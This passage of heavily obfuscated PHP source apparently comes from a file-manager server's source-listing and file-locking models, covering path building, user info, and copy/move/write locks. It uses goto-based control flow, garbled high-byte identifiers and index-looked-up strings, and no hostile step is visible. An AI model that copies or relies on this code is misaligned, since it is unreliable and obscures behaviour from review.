($c…Õ­¾­¨ as $aã•ô³öŒÑ) { $dšŸŠå˜ò¶ = Model($E…‰º•ù×ñ[486])->getInfo($aã•ô³öŒÑ); $bÇ‹ƒŸ¯ùæ .= $dšŸŠå˜ò¶[$E…‰º•ù×ñ[85]][$E…‰º•ù×ñ[395]] . $E…‰º•ù×ñ[47]; } goto fØ’¬ˆ‹Œ; cäÌ¡Ø¾Ï: $E…‰º•ù×ñ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($EíİØ‡²¼[$E…‰º•ù×ñ[404]] != self::TYPE_GROUP) { return; } $B—Œ¹†œ–¤ = Model($E…‰º•ù×ñ[486])->getInfo($EíİØ‡²¼[$E…‰º•ù×ñ[484]]); goto EÏ›êÒ×Ã; eÊ”Œ¦Æ™†: } protected function _listAppendPath(&$e¯’Ã¤Ş–) { goto Dß±Ê°ŠÕô; A©Àï¶¼“Ù: unset($E´à‹øİóŸ); return $e¯’Ã¤Ş–; goto Cèºõ¢İÈÊ; c…—¹¢—“: $CÙàË«­“ = array(); foreach ($e¯’Ã¤Ş– as &$E´à‹øİóŸ) { $bÙèçî„«÷ = $E´à‹øİóŸ[$EĞ¯Ã¹Á“Ó[403]] == $EĞ¯Ã¹Á“Ó[87]; if ($bÙèçî„«÷) { $b«ÒƒªÙ‹[$E´à‹øİóŸ[$EĞ¯Ã¹Á“Ó[395]]] = $E´à‹øİóŸ[$EĞ¯Ã¹Á“Ó[28]]; } if (isset($CÙàË«­“[$E´à‹øİóŸ[$EĞ¯Ã¹Á“Ó[487]]])) { continue; } $CÙàË«­“[$E´à‹øİóŸ[$EĞ¯Ã¹Á“Ó[487]]] = !0; $a§Ûà“’— = $this->parentLevelArray($E´à‹øİóŸ[$EĞ¯Ã¹Á“Ó[487]]); foreach ($a§Ûà“’— as $F¥Û¬¾†Êˆ => $B‘æ’¬÷Ìç) { if ($F¥Û¬¾†Êˆ != 0 && !isset($b«ÒƒªÙ‹[$B‘æ’¬÷Ìç])) { $b¹´´ÌÍ½¤[] = $B‘æ’¬÷Ìç; } } } unset($E´à‹øİóŸ); goto B°¶¸ñ¶‡«; Dß±Ê°ŠÕô: $EĞ¯Ã¹Á“Ó =& $_SERVER[ÒÆ›ÆØÎ¾]; static $b«ÒƒªÙ‹ = array(); $b¹´´ÌÍ½¤ = array(); goto c…—¹¢—“; Aµ§Åõö²: $cç‘øº»Ò = array(); $E£‘·óó÷ = array(); foreach ($e¯’Ã¤Ş– as &$E´à‹øİóŸ) { goto C‘ôâ¾±¿; D¥öË§ò…‹: if (intval($E´à‹øİóŸ[$EĞ¯Ã¹Á“Ó[404]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($E´à‹øİóŸ, $a§Ûà“’—, $cªìÈ²Çš); } goto A¨×…çÀ‚ø; C‘ôâ¾±¿: $fØ÷÷˜±¬Ú = $E´à‹øİóŸ[$EĞ¯Ã¹Á“Ó[487]]; if (isset($E£‘·óó÷[$fØ÷÷˜±¬Ú])) { $cÒÔì‚†¨ = $cç‘øº»Ò[$fØ÷÷˜±¬Ú]; } else { $a§Ûà“’— = $this->parentLevelArray($E´à‹øİóŸ[$EĞ¯Ã¹Á“Ó[487]]); $fö™àÂÍ… = $EĞ¯Ã¹Á“Ó[494] . $E´à‹øİóŸ[$EĞ¯Ã¹Á“Ó[404]] . $EĞ¯Ã¹Á“Ó[440] . $E´à‹øİóŸ[$EĞ¯Ã¹Á“Ó[484]]; if ($cç‘øº»Ò[$fö™àÂÍ…]) { $cÒÔì‚†¨ = $cç‘øº»Ò[$fö™àÂÍ…]; } else { $cÒÔì‚†¨ = $this->_listAppendPathRoot($E´à‹øİóŸ, $a§Ûà“’—); $cç‘øº»Ò[$fö™àÂÍ…] = $cÒÔì‚†¨; } foreach ($a§Ûà“’— as $F¥Û¬¾†Êˆ => $B‘æ’¬÷Ìç) { if ($F¥Û¬¾†Êˆ == 0 && $cÒÔì‚†¨ && $E´à‹øİóŸ[$EĞ¯Ã¹Á“Ó[404]] == self::TYPE_GROUP) { continue; } if (isset($b«ÒƒªÙ‹[$B‘æ’¬÷Ìç])) { $cÒÔì‚†¨ .= $b«ÒƒªÙ‹[$B‘æ’¬÷Ìç] . $EĞ¯Ã¹Á“Ó[8]; } } if ($a§Ûà“’—) { $cÒÔì‚†¨ .= $E´à‹øİóŸ[$EĞ¯Ã¹Á“Ó[28]]; } $cç‘øº»Ò[$fØ÷÷˜±¬Ú] = $cÒÔì‚†¨; } if ($E´à‹øİóŸ[$EĞ¯Ã¹Á“Ó[403]]) { $cÒÔì‚†¨ .= $EĞ¯Ã¹Á“Ó[8]; } goto AãÀŠœÛŒË; AãÀŠœÛŒË: $E´à‹øİóŸ[$EĞ¯Ã¹Á“Ó[495]] = str_replace($EĞ¯Ã¹Á“Ó[496], $EĞ¯Ã¹Á“Ó[8], $cÒÔì‚†¨); $c»à·å±…¹ = trim($E´à‹øİóŸ[$EĞ¯Ã¹Á“Ó[495]], $EĞ¯Ã¹Á“Ó[8]); if ($E´à‹øİóŸ[$EĞ¯Ã¹Á“Ó[478]] == $EĞ¯Ã¹Á“Ó[191] && $c»à·å±…¹) { $E´à‹øİóŸ[$EĞ¯Ã¹Á“Ó[28]] = $c»à·å±…¹; } goto D¥öË§ò…‹; A¨×…çÀ‚ø: } goto A©Àï¶¼“Ù; B°¶¸ñ¶‡«: $b¹´´ÌÍ½¤ = array_unique($b¹´´ÌÍ½¤); if (count($b¹´´ÌÍ½¤) > 0) { $f¾º‰Şöå‚ = array($EĞ¯Ã¹Á“Ó[410] => array($EĞ¯Ã¹Á“Ó[411], $b¹´´ÌÍ½¤)); if (count($b¹´´ÌÍ½¤) == 1) { $AÒ¨ì¢Œ = $this->sourceInfo($b¹´´ÌÍ½¤[0]); $aºİë™¨ˆ = is_array($AÒ¨ì¢Œ) ? array($AÒ¨ì¢Œ) : !1; } else { $aºİë™¨ˆ = $this->field($EĞ¯Ã¹Á“Ó[493])->where($f¾º‰Şöå‚)->select(); } if (!$aºİë™¨ˆ) { $aºİë™¨ˆ = array(); } foreach ($aºİë™¨ˆ as $dğº‡Ó¹›•) { $b«ÒƒªÙ‹[$dğº‡Ó¹›•[$EĞ¯Ã¹Á“Ó[395]]] = $dğº‡Ó¹›•[$EĞ¯Ã¹Á“Ó[28]]; } } $cªìÈ²Çš = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto Aµ§Åõö²; Cèºõ¢İÈÊ: } private function _listAppendPathRecycle(&$B¾ÁÔİöº, $B¹µ§ä‹«, $f®Ú’°ËÕ) { goto CÖø©Ğ°·; b¨½Ø„çİà: if ($B¾ÁÔİöº[$C•óÃ»ÆÉÒ[395]] == $f®Ú’°ËÕ) { $B¾ÁÔİöº[$C•óÃ»ÆÉÒ[487]] = $C•óÃ»ÆÉÒ[498]; $B¾ÁÔİöº[$C•óÃ»ÆÉÒ[478]] = $C•óÃ»ÆÉÒ[191]; $B¾ÁÔİöº[$C•óÃ»ÆÉÒ[28]] = LNG($C•óÃ»ÆÉÒ[497]); } $B¾ÁÔİöº[$C•óÃ»ÆÉÒ[499]] = $C•óÃ»ÆÉÒ[500]; goto DŒî§ÓÛÂº; CÖø©Ğ°·: $C•óÃ»ÆÉÒ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!in_array($f®Ú’°ËÕ, $B¹µ§ä‹«) && $B¾ÁÔİöº[$C•óÃ»ÆÉÒ[395]] != $f®Ú’°ËÕ) { return; } $BÈ„Â×ËÎ = explode($C•óÃ»ÆÉÒ[8], trim($B¾ÁÔİöº[$C•óÃ»ÆÉÒ[495]], $C•óÃ»ÆÉÒ[8])); goto D¦­å»àÍÆ; D¦­å»àÍÆ: $b²¢„¯¯• = implode($C•óÃ»ÆÉÒ[8], array_slice($BÈ„Â×ËÎ, 2)); $B¾ÁÔİöº[$C•óÃ»ÆÉÒ[495]] = $C•óÃ»ÆÉÒ[8] . LNG($C•óÃ»ÆÉÒ[497]) . $C•óÃ»ÆÉÒ[8] . ltrim($b²¢„¯¯•, $C•óÃ»ÆÉÒ[8]); $B¾ÁÔİöº[$C•óÃ»ÆÉÒ[487]] = $C•óÃ»ÆÉÒ[498] . implode($C•óÃ»ÆÉÒ[47], array_slice($B¹µ§ä‹«, 1)) . $C•óÃ»ÆÉÒ[47]; goto b¨½Ø„çİà; DŒî§ÓÛÂº: } protected function _listAppendPathRoot(&$A´ƒìÒ÷ÉÀ, $b¼˜ŠÅ»ö—) { $e…èªê”˜¬ =& $_SERVER[ÒÆ›ÆØÎ¾]; $CÎëÉ–Ë– = $e…èªê”˜¬[33]; if ($A´ƒìÒ÷ÉÀ[$e…èªê”˜¬[404]] == self::TYPE_USER) { if (defined($e…èªê”˜¬[454]) && $A´ƒìÒ÷ÉÀ[$e…èªê”˜¬[484]] == USER_ID) { $CÎëÉ–Ë– = LNG($e…èªê”˜¬[501]); if (!$b¼˜ŠÅ»ö—) { $A´ƒìÒ÷ÉÀ[$e…èªê”˜¬[28]] = $CÎëÉ–Ë–; } } else { $e ¦ŸŠ¸”Ô = Model($e…èªê”˜¬[502])->getInfoSimple($A´ƒìÒ÷ÉÀ[$e…èªê”˜¬[484]]); $CÎëÉ–Ë– = LNG($e…èªê”˜¬[503]) . $e…èªê”˜¬[160] . $e ¦ŸŠ¸”Ô[$e…èªê”˜¬[28]] . $e…èªê”˜¬[504]; } } else { if ($A´ƒìÒ÷ÉÀ[$e…èªê”˜¬[404]] == self::TYPE_GROUP) { $e ¦ŸŠ¸”Ô = Model($e…èªê”˜¬[486])->getInfoSimple($A´ƒìÒ÷ÉÀ[$e…èªê”˜¬[484]]); $CÎëÉ–Ë– = $e ¦ŸŠ¸”Ô[$e…èªê”˜¬[28]]; } else { if ($A´ƒìÒ÷ÉÀ[$e…èªê”˜¬[404]] == self::TYPE_SYSTEM) { $CÎëÉ–Ë– = $e…èªê”˜¬[505]; } } } $CÎëÉ–Ë– = $CÎëÉ–Ë– ? $e…èªê”˜¬[8] . $CÎëÉ–Ë– . $e…èªê”˜¬[8] : $e…èªê”˜¬[8]; return $CÎëÉ–Ë–; } protected function _listAppendUser(&$Bî»›‚¸™Ø) { goto c›°íÊöŞò; A»š‹Ú‹¡È: unset($dÇ¬†ŠèŒ); goto F£ø¤ÅŸ…¡; f¡²¨¥æñ¾: $dÄ”ªÒØÖì = array_merge($b›…ˆ¢‡Ö , $DğØšÑ…•ì); $D„Ôô•ß²ƒ = Model($Fª÷–•°Ê£[506])->userListInfo($dÄ”ªÒØÖì); foreach ($Bî»›‚¸™Ø as &$dÇ¬†ŠèŒ) { $EÃÀÂäº = $dÇ¬†ŠèŒ[$Fª÷–•°Ê£[432]]; $dÇ¬†ŠèŒ[$Fª÷–•°Ê£[432]] = $D„Ôô•ß²ƒ[$EÃÀÂäº] ? $D„Ôô•ß²ƒ[$EÃÀÂäº] : !1; $EÃÀÂäº = $dÇ¬†ŠèŒ[$Fª÷–•°Ê£[434]]; $dÇ¬†ŠèŒ[$Fª÷–•°Ê£[434]] = $D„Ôô•ß²ƒ[$EÃÀÂäº] ? $D„Ôô•ß²ƒ[$EÃÀÂäº] : !1; if (isset($dÇ¬†ŠèŒ[$Fª÷–•°Ê£[445]]) && $dÇ¬†ŠèŒ[$Fª÷–•°Ê£[445]][$Fª÷–•°Ê£[507]]) { $F½‡Õ‰ „é = $GLOBALS[$Fª÷–•°Ê£[6]][$Fª÷–•°Ê£[88]][$Fª÷–•°Ê£[508]]; if ($dÇ¬†ŠèŒ[$Fª÷–•°Ê£[445]][$Fª÷–•°Ê£[509]] <= time() - $F½‡Õ‰ „é) { $this->metaSet($dÇ¬†ŠèŒ[$Fª÷–•°Ê£[395]], $Fª÷–•°Ê£[507], null); $this->metaSet($dÇ¬†ŠèŒ[$Fª÷–•°Ê£[395]], $Fª÷–•°Ê£[509], null); unset($dÇ¬†ŠèŒ[$Fª÷–•°Ê£[445]][$Fª÷–•°Ê£[507]]); continue; } $c™ÕİÆ›Œ² = $dÇ¬†ŠèŒ[$Fª÷–•°Ê£[445]][$Fª÷–•°Ê£[507]]; $dÇ¬†ŠèŒ[$Fª÷–•°Ê£[445]][$Fª÷–•°Ê£[510]] = Model($Fª÷–•°Ê£[506])->getInfoSimpleOuter($c™ÕİÆ›Œ²); } } goto A»š‹Ú‹¡È; c›°íÊöŞò: $Fª÷–•°Ê£ =& $_SERVER[ÒÆ›ÆØÎ¾]; $b›…ˆ¢‡Ö  = array_to_keyvalue($Bî»›‚¸™Ø, $Fª÷–•°Ê£[33], $Fª÷–•°Ê£[432]); $DğØšÑ…•ì = array_to_keyvalue($Bî»›‚¸™Ø, $Fª÷–•°Ê£[33], $Fª÷–•°Ê£[434]); goto f¡²¨¥æñ¾; F£ø¤ÅŸ…¡: } public function parentLevelArray($bÏãÇ¤éÙÖ) { $eí‡óË«Á =& $_SERVER[ÒÆ›ÆØÎ¾]; $bÏãÇ¤éÙÖ = explode($eí‡óË«Á[47], trim($bÏãÇ¤éÙÖ, $eí‡óË«Á[47])); return array_remove_value($bÏãÇ¤éÙÖ, $eí‡óË«Á[191]); } public function listAll($DÓßì™‘Í´) { goto eï‚´¿õÜÅ; eï‚´¿õÜÅ: $Bàƒ«ÖáŞ =& $_SERVER[ÒÆ›ÆØÎ¾]; $E“òˆİÆ = $this->sourceInfo($DÓßì™‘Í´); $AÌÜ¶Ÿå÷ä = array($Bàƒ«ÖáŞ[511] => array($Bàƒ«ÖáŞ[512], $E“òˆİÆ[$Bàƒ«ÖáŞ[487]] . $DÓßì™‘Í´ . $Bàƒ«ÖáŞ[513]), $Bàƒ«ÖáŞ[514] => 0); goto B¦Şƒà—§†; bêˆªêª„á: $B½á°¹Ş¤Æ = array_to_keyvalue($B½á°¹Ş¤Æ, $Bàƒ«ÖáŞ[395]); $B¾§ˆÛò×¶ = "\57{$E“òˆİÆ[$Bàƒ«ÖáŞ[28]]}\x2f"; $B¾§ˆÛò×¶ = $B¾§ˆÛò×¶ == $Bàƒ«ÖáŞ[496] ? $Bàƒ«ÖáŞ[8] : $B¾§ˆÛò×¶; goto A…Á‘ù¸¬´; B¦Şƒà—§†: $eî°ö‚¼Éœ = $Bàƒ«ÖáŞ[515]; $f…ÄÔõƒ½ = "\x4c\x45\106\124\40\112\x4f\111\116\40{$this->tablePrefix}\151\157\137\146\151\154\x65\40\146\x69\x6c\x65\x20\x6f\x6e\40\x73\157\165\162\143\x65\x2e\x66\x69\x6c\145\x49\104\40\75\40\146\151\154\145\56\146\x69\154\x65\x49\104"; $B½á°¹Ş¤Æ = $this->alias($Bàƒ«ÖáŞ[516])->field($eî°ö‚¼Éœ)->where($AÌÜ¶Ÿå÷ä)->join($f…ÄÔõƒ½)->select(); goto dø÷‘ŸšÒË; A…Á‘ù¸¬´: $dê“øÜª»Ú = array(); foreach ($B½á°¹Ş¤Æ as $EÛØ¡òõĞ¢ => $eì²°÷­Ş›) { goto fÌçŠ±¶; fÌçŠ±¶: $b÷¯¼¡õÆÑ = $this->parentLevelArray($eì²°÷­Ş›[$Bàƒ«ÖáŞ[487]]); array_shift($b÷¯¼¡õÆÑ); $eÆ ¥Ÿñ‚ = $B¾§ˆÛò×¶; goto dšëŒ²¤®Ç; d‡¾ğèÁîÚ: if (!$eì²°÷­Ş›[$Bàƒ«ÖáŞ[403]]) { $bèóÕ”›Îù[$Bàƒ«ÖáŞ[447]] = $eì²°÷­Ş›[$Bàƒ«ÖáŞ[447]]; $bèóÕ”›Îù[$Bàƒ«ÖáŞ[86]] = $eì²°÷­Ş›[$Bàƒ«ÖáŞ[76]]; } $dê“øÜª»Ú[] = $bèóÕ”›Îù; goto aãœ¥¦Ö÷; aùó±£…ƒ÷: $eÆ ¥Ÿñ‚ = str_replace($Bàƒ«ÖáŞ[496], $Bàƒ«ÖáŞ[8], $eÆ ¥Ÿñ‚); $eÆ ¥Ÿñ‚ = str_replace($Bàƒ«ÖáŞ[496], $Bàƒ«ÖáŞ[8], $eÆ ¥Ÿñ‚); $bèóÕ”›Îù = array($Bàƒ«ÖáŞ[414] => str_replace($Bàƒ«ÖáŞ[496], $Bàƒ«ÖáŞ[8], $eÆ ¥Ÿñ‚), $Bàƒ«ÖáŞ[517] => intval($eì²°÷­Ş›[$Bàƒ«ÖáŞ[403]]), $Bàƒ«ÖáŞ[85] => $this->pathInfoFilter($eì²°÷­Ş›)); goto d‡¾ğèÁîÚ; dšëŒ²¤®Ç: for ($Fª³ÊÅ¥„Â = 0; $Fª³ÊÅ¥„Â < count($b÷¯¼¡õÆÑ); $Fª³ÊÅ¥„Â++) { $eÆ ¥Ÿñ‚ .= $B½á°¹Ş¤Æ[$b÷¯¼¡õÆÑ[$Fª³ÊÅ¥„Â]][$Bàƒ«ÖáŞ[28]] . $Bàƒ«ÖáŞ[8]; } $eÆ ¥Ÿñ‚ .= $eì²°÷­Ş›[$Bàƒ«ÖáŞ[28]]; if ($eì²°÷­Ş›[$Bàƒ«ÖáŞ[403]]) { $eÆ ¥Ÿñ‚ .= $Bàƒ«ÖáŞ[8]; } goto aùó±£…ƒ÷; aãœ¥¦Ö÷: } return $dê“øÜª»Ú; goto b­ÃÅ¬ªè; dø÷‘ŸšÒË: $this->_listAppendAuth($B½á°¹Ş¤Æ); $this->_listAppendUser($B½á°¹Ş¤Æ); $this->_listAppendPath($B½á°¹Ş¤Æ); goto bêˆªêª„á; b­ÃÅ¬ªè: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($CÉŞÖåÓá) { goto dÆ©íËƒ©Œ; DîÖ £×ôœ: $BÜ«‘ÓÏ¥‚ = 1; $this->_lockEvent($CÉŞÖåÓá, array($e‹¬æ“…Âæ[519], $e‹¬æ“…Âæ[520]), $BÜ«‘ÓÏ¥‚); $this->_lockParent($CÉŞÖåÓá, array($e‹¬æ“…Âæ[520]), $BÜ«‘ÓÏ¥‚); goto f©í¯ƒ×î­; dÆ©íËƒ©Œ: $e‹¬æ“…Âæ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->allowLock()) { return; } $this->_lockCheck($e‹¬æ“…Âæ[518], $CÉŞÖåÓá); goto DîÖ £×ôœ; f©í¯ƒ×î­: $this->_lockEvent($CÉŞÖåÓá, array($e‹¬æ“…Âæ[521], $e‹¬æ“…Âæ[522]), $BÜ«‘ÓÏ¥‚); $this->_lockCheckEnd($e‹¬æ“…Âæ[518], $CÉŞÖåÓá); goto b¯ôô–ó¸î; b¯ôô–ó¸î: } public function lockCopyEnd($cÕøŠ¨Œ‰ˆ) { $CŒ„Â‘‹ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->allowLock()) { return; } $eÏ…Ã‹“‘ = 0; $this->_lockEvent($cÕøŠ¨Œ‰ˆ, array($CŒ„Â‘‹[519], $CŒ„Â‘‹[520]), $eÏ…Ã‹“‘); $this->_lockParent($cÕøŠ¨Œ‰ˆ, array($CŒ„Â‘‹[520]), $eÏ…Ã‹“‘); $this->_lockEvent($cÕøŠ¨Œ‰ˆ, array($CŒ„Â‘‹[521], $CŒ„Â‘‹[522]), $eÏ…Ã‹“‘); } public function lockWriteStart($bí” ½†, $f†•Ÿ†øØ´ = '') { goto E¾½Šç»ì; Aóè ÆÆÑò: $this->_lockParent($bí” ½†, array($c¿¿ïçèòî[518], $c¿¿ïçèòî[520]), $eì¢˜Ã©éä); $this->_lockCheckEnd($c¿¿ïçèòî[519], $bí” ½†); goto E ä´—¬óŒ; E¾½Šç»ì: $c¿¿ïçèòî =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->allowLock()) { return; } $this->_lockCheck($c¿¿ïçèòî[519], $bí” ½†); goto A‘ùÁÏê; A‘ùÁÏê: $eì¢˜Ã©éä = 1; $this->_lockKey($c¿¿ïçèòî[523] . $bí” ½† . $c¿¿ïçèòî[95] . $f†•Ÿ†øØ´, $eì¢˜Ã©éä); $this->_lockEvent($bí” ½†, array($c¿¿ïçèòî[518], $c¿¿ïçèòî[520]), $eì¢˜Ã©éä); goto Aóè ÆÆÑò; E ä´—¬óŒ: } public function lockWriteEnd($a¥¸—„Ô’, $e¢òØŒĞŒª = '') { $CŸæ¹´ä©” =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->allowLock()) { return; } $F°›ˆ¼¹…„ = 0; $this->_lockKey($CŸæ¹´ä©”[523] . $a¥¸—„Ô’ . $CŸæ¹´ä©”[95] . $e¢òØŒĞŒª, $F°›ˆ¼¹…„); $this->_lockEvent($a¥¸—„Ô’, array($CŸæ¹´ä©”[518], $CŸæ¹´ä©”[520]), $F°›ˆ¼¹…„); $this->_lockParent($a¥¸—„Ô’, array($CŸæ¹´ä©”[518], $CŸæ¹´ä©”[520]), $F°›ˆ¼¹…„); } public function lockMoveStart($dù±¤“Ì†) { goto a–ÃÙåÙ; cà…×Ë¶Ä˜: $this->_lockParent($dù±¤“Ì†, array($CîÀã¼½…Ù[518], $CîÀã¼½…Ù[520]), $c´É¬æÀÑ¡); $this->_lockEvent($dù±¤“Ì†, array($CîÀã¼½…Ù[525], $CîÀã¼½…Ù[521], $CîÀã¼½…Ù[522]), $c´É¬æÀÑ¡); $this->_lockCheckEnd($CîÀã¼½…Ù[520], $dù±¤“Ì†); goto B¹ŸáÆ¡Ì–; Bìò‡¬§¹: $c´É¬æÀÑ¡ = 1; $this->_lockKey($CîÀã¼½…Ù[524] . $dù±¤“Ì†, $c´É¬æÀÑ¡); $this->_lockEvent($dù±¤“Ì†, array($CîÀã¼½…Ù[518], $CîÀã¼½…Ù[519]), $c´É¬æÀÑ¡); goto cà…×Ë¶Ä˜; a–ÃÙåÙ: $CîÀã¼½…Ù =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->allowLock()) { return; } $this->_lockCheck($CîÀã¼½…Ù[520], $dù±¤“Ì†); goto Bìò‡¬§¹; B¹ŸáÆ¡Ì–: } public function lockMoveEnd($D‰¶Ï¿£ƒ) { goto b”²•ŠÃ¾Ş; b”²•ŠÃ¾Ş: $C“™ŠôÀòé =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->allowLock()) { return; } $CºáÍÕçÖÓ = 0; goto D¦ÁŞ÷Åƒ§; aéê“¦ÊÃñ: $this->_lockEvent($D‰¶Ï¿£ƒ, array($C“™ŠôÀòé[525], $C“™ŠôÀòé[521], $C“™ŠôÀòé[522]), $CºáÍÕçÖÓ); goto e—Óßó¾Ä; D¦ÁŞ÷Åƒ§: $this->_lockKey($C“™ŠôÀòé[524] . $D‰¶Ï¿£ƒ, $CºáÍÕçÖÓ); $this->_lockEvent($D‰¶Ï¿£ƒ, array($C“™ŠôÀòé[518], $C“™ŠôÀòé[519]), $CºáÍÕçÖÓ); $this->_lockParent($D‰¶Ï¿£ƒ, array($C“™ŠôÀòé[518], $C“™ŠôÀòé[520]), $CºáÍÕçÖÓ); goto aéê“¦ÊÃñ; e—Óßó¾Ä: } private function _lockCheck($A‚ÈãËî‹—, $c«İÑŸë—ó) { goto Dª™í¦£; Dª™í¦£: $e¾••Ó‚å÷ =& $_SERVER[ÒÆ›ÆØÎ¾]; $F©¨ŸÊ±ŒŞ = $this->sourceInfo($c«İÑŸë—ó); $bíŒÅïÊƒ” = $A‚ÈãËî‹— . $e¾••Ó‚å÷[95] . $c«İÑŸë—ó; goto bèá·é é; FàõÃ¿ˆŸê: CacheLock::setErrorMsg($e¾••Ó‚å÷[160] . htmlspecialchars($F©¨ŸÊ±ŒŞ[$e¾••Ó‚å÷[28]]) . $e¾••Ó‚å÷[504] . $BÅÙİÉÑÚ); $this->_lockKey($bíŒÅïÊƒ”, 1); $this->_lockKey($bíŒÅïÊƒ”, 0); goto B¸¤î™òƒ; B¸¤î™òƒ: $C–ªÕÓáÏˆ = array_reverse($this->parentLevelArray($F©¨ŸÊ±ŒŞ[$e¾••Ó‚å÷[487]])); foreach ($C–ªÕÓáÏˆ as $aÚÒ¬ƒ‚„í) { $bíŒÅïÊƒ” = $A‚ÈãËî‹— . $e¾••Ó‚å÷[527] . $aÚÒ¬ƒ‚„í; if (CacheLock::lockGet($e¾••Ó‚å÷[528] . $bíŒÅïÊƒ”)) { $F©¨ŸÊ±ŒŞ = $this->sourceInfo($aÚÒ¬ƒ‚„í); CacheLock::setErrorMsg($e¾••Ó‚å÷[160] . htmlspecialchars($F©¨ŸÊ±ŒŞ[$e¾••Ó‚å÷[28]]) . $e¾••Ó‚å÷[504] . $BÅÙİÉÑÚ); $this->_lockKey($bíŒÅïÊƒ”, 1); $this->_lockKey($bíŒÅïÊƒ”, 0); } } goto CŞĞ–ÔÕ; bèá·é é: $this->_lockTimeStart[$bíŒÅïÊƒ”] = timeFloat(); if (!is_array($F©¨ŸÊ±ŒŞ)) { return; } $BÅÙİÉÑÚ = LNG($e¾••Ó‚å÷[526]); goto FàõÃ¿ˆŸê; CŞĞ–ÔÕ: } private function _lockCheckEnd($e‹£¤ÒÒ±, $BÅ‡¶È»Ê³) { goto dÁ¶²Ş´ö†; dÁ¶²Ş´ö†: $aö„ÁµÆ‰Ø =& $_SERVER[ÒÆ›ÆØÎ¾]; $d ¨èÁ´§œ = $e‹£¤ÒÒ± . $aö„ÁµÆ‰Ø[95] . $BÅ‡¶È»Ê³; CacheLock::setErrorMsg($aö„ÁµÆ‰Ø[375]); goto Eº±¿¤ù¾; Eº±¿¤ù¾: if (!isset($this->_lockTimeStart[$d ¨èÁ´§œ])) { return; } $Aà²ÈÓÌÍ = timeFloat() - $this->_lockTimeStart[$d ¨èÁ´§œ]; unset($this->_lockTimeStart[$d ¨èÁ´§œ]); goto eöÙ—‡è¹‰; eöÙ—‡è¹‰: if ($Aà²ÈÓÌÍ > 0.5) { unset(self::$cacheSourceInfo[$aö„ÁµÆ‰Ø[438] . $BÅ‡¶È»Ê³]); } $F°ãîë¦á = $this->sourceInfo($BÅ‡¶È»Ê³); if (!$F°ãîë¦á) { show_json(LNG($aö„ÁµÆ‰Ø[105]), !1); } goto eó¸Åİ…”; eó¸Åİ…”: } private function _lockParent($dáºÚƒ”±, $e¢å·, $Cß¸Û™˜ˆ) { if (!$this->autoLockSet) { return; } $b£°–Öë¯Ü = $this->sourceInfo($dáºÚƒ”±); if (!is_array($b£°–Öë¯Ü)) { return; } $d•‚Œ¥×ŞŒ = array_reverse($this->parentLevelArray($b£°–Öë¯Ü[$_SERVER[ÒÆ›ÆØÎ¾][487]])); foreach ($d•‚Œ¥×ŞŒ as $FÀÏ÷½¸¼) { $this->_lockEvent($FÀÏ÷½¸¼, $e¢å·, $Cß¸Û™˜ˆ); } } private function _lockEvent($e³Ã˜¯ß¡È, $F˜Î»§ƒ¼ì, $eœÔ¥Ë×²) { $B¼í÷®œå =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->autoLockSet) { return; } foreach ($F˜Î»§ƒ¼ì as $Döìì¿ƒÄÅ) { $bŞÕÂ‡ÄÈ = $Döìì¿ƒÄÅ . $B¼í÷®œå[95] . $e³Ã˜¯ß¡È; if ($eœÔ¥Ë×² && CacheLock::lockGet($B¼í÷®œå[528] . $bŞÕÂ‡ÄÈ)) { continue; } $this->_lockKey($bŞÕÂ‡ÄÈ, $eœÔ¥Ë×²); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($d„äê²¦¸Ë, $aåÚ½ÎË ¦ = 1) { $fßÑÑ‚Ò ± = $_SERVER[ÒÆ›ÆØÎ¾][528] . md5($d„äê²¦¸Ë); if ($aåÚ½ÎË ¦) { if (isset(self::$_lockItemArr[$fßÑÑ‚Ò ±])) { return; } self::$_lockItemArr[$fßÑÑ‚Ò ±] = 1; CacheLock::lock($fßÑÑ‚Ò ±, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$fßÑÑ‚Ò ±])) { return; } unset(self::$_lockItemArr[$fßÑÑ‚Ò ±]); CacheLock::unlock($fßÑÑ‚Ò ±); } } public function isParentOf($cœ„–•É‹·, $E’ÏËÔù™ˆ) { goto fÜøë°µŠñ; bÀŸ°¿·Ü¨: $EÇ¥°äèó = $D²™Á«áÑ£[$c‹›Á‘‚ĞÏ[487]] . $D²™Á«áÑ£[$c‹›Á‘‚ĞÏ[395]] . $c‹›Á‘‚ĞÏ[47]; $fˆŠá»Áã = $cè°­Œ‹×Œ[$c‹›Á‘‚ĞÏ[487]] . $cè°­Œ‹×Œ[$c‹›Á‘‚ĞÏ[395]] . $c‹›Á‘‚ĞÏ[47]; $F‡öŞŞ£“Ê = strpos($fˆŠá»Áã, $EÇ¥°äèó) === 0; goto e²øÇ¯¥Œ‰; fÜøë°µŠñ: $c‹›Á‘‚ĞÏ =& $_SERVER[ÒÆ›ÆØÎ¾]; $D²™Á«áÑ£ = $this->sourceInfo($cœ„–•É‹·); $cè°­Œ‹×Œ = $this->sourceInfo($E’ÏËÔù™ˆ); goto bÀŸ°¿·Ü¨; e²øÇ¯¥Œ‰: return $F‡öŞŞ£“Ê; goto AØöâ…ÈŸ“; AØöâ…ÈŸ“: } private $targetIsDelete = 0; public function copy($dÔø‹í´îÛ, $c‚¡ ëÎĞÒ, $C¯÷ÚÀÀ“Æ = REPEAT_REPLACE, $AİÄÚ‹«ë‹ = '') { goto eßÑä‰°èÙ; eßÑä‰°èÙ: $bñË…¤Ãó« =& $_SERVER[ÒÆ›ÆØÎ¾]; $EÅëÏ‹²‡Ú = $this->sourceInfo($dÔø‹í´îÛ); $b³÷½èó´ = $this->sourceInfo($c‚¡ ëÎĞÒ); goto dß„âÏÙ; eË¸ÛôÆ: $this->saveAll($d®¨Š±áëà[$bñË…¤Ãó«[531]]); 